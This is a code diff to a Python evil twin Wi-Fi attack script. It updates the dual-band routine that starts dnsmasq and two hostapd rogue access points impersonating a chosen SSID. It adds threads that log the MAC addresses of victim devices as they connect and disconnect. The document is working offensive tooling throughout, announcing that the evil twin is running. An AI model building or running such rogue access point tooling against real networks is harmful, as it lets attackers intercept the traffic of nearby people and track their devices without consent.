@@ -6,11 +6,29 @@ import signal
 import time
 import ipaddress
 import shutil
-
+import threading, re
 
 dnsmasq_proc = None
 hostapd_proc = None
 script_args = None
+
+
+CONNECT_RE    = re.compile(r'AP-STA-CONNECTED\s+([0-9a-f:]{17})', re.I)
+DISCONNECT_RE = re.compile(r'AP-STA-DISCONNECTED\s+([0-9a-f:]{17})', re.I)
+ASSOC_RE      = re.compile(r'STA\s+([0-9a-f:]{17}).*(authenticated|associated)', re.I)
+hostapd_procs = []
+
+def stream_hostapd_events(tag: str, proc: subprocess.Popen):
+    try:
+        for line in proc.stdout:
+            if not line:
+                break
+            s = line.strip()
+            if CONNECT_RE.search(s) or DISCONNECT_RE.search(s) or ASSOC_RE.search(s):
+                print(f"[hostapd:{tag}] {s}", flush=True)
+    except Exception as e:
+        print(f"[-] hostapd stream error ({tag}): {e}")
+
 
 def run_command(command, suppress_output=True, ignore_errors=False):
     try:
@@ -570,49 +588,58 @@ def start_attack():
 
 #####################################################################
 
+
 def start_attack_dual(channel1: str, channel2: str):
-    global dnsmasq_proc, hostapd_proc
+    global dnsmasq_proc, hostapd_procs
+    hostapd_procs = []
     print("[*] Starting the attack...")
-    
+
     subprocess.run(['pkill', 'dnsmasq'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(1)
-    
+
     try:
         print("[*] Starting dnsmasq...")
-        dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', 'dnsmasq_dual.conf', '-d'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
+        dnsmasq_proc = subprocess.Popen(
+            ['dnsmasq', '-C', 'dnsmasq_dual.conf', '-d'],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, bufsize=1
+        )
+
         print("[*] Starting hostapd...")
-        hostapd_proc = subprocess.Popen(['hostapd', 'hostapd_24.conf'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        hostapd_proc2 = subprocess.Popen(['hostapd', 'hostapd_5.conf'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        p1 = subprocess.Popen(
+            ['hostapd', 'hostapd_24.conf'],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, bufsize=1
+        )
+        p2 = subprocess.Popen(
+            ['hostapd', 'hostapd_5.conf'],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, bufsize=1
+        )
+        hostapd_procs = [p1, p2]
 
         time.sleep(2)
-        
-        if dnsmasq_proc.poll() is not None:
-            stdout, stderr = dnsmasq_proc.communicate()
-            print("[-] dnsmasq failed to start. Error output:")
-            print(stderr.decode().strip())
-            raise Exception("dnsmasq failed.")
 
-        if hostapd_proc.poll() is not None:
-            stdout, stderr = hostapd_proc.communicate()
-            print("[-] hostapd failed to start. Error output:")
-            print(stderr.decode().strip())
-            raise Exception("hostapd failed.")
-        
-        if hostapd_proc2.poll() is not None:
-            stdout, stderr = hostapd_proc2.communicate()
-            print("[-] hostapd failed to start. Error output:")
-            print(stderr.decode().strip())
-            raise Exception("hostapd failed.")  
-         
+        for name, p in (('dnsmasq', dnsmasq_proc), ('hostapd_24', p1), ('hostapd_5', p2)):
+            if p.poll() is not None:
+                out = p.stdout.read() if p.stdout else ""
+                print(f"[-] {name} failed to start. Error output:\n{out}")
+                raise Exception(f"{name} failed.")
+
+        threading.Thread(target=stream_hostapd_events,
+                         args=(script_args.iface1, p1), daemon=True).start()
+        threading.Thread(target=stream_hostapd_events,
+                         args=(script_args.iface2, p2), daemon=True).start()
+
         print("\n[+] EVIL TWIN IS RUNNING!")
         print(f"[+] SSID: {script_args.ssid} on Channel: {channel1} and Channel {channel2}")
         print("[+] Press CTRL+C to stop the attack and clean up.")
-        
-    except Exception as e:
-        print(f"[-] Failed to start attack processes.")
-        cleanup(0, 0)
+
+    except Exception:
+        print("[-] Failed to start attack processes.")
+        cleanup_dual(0, 0)
         sys.exit(1)
+
 
 #####################################################################
 
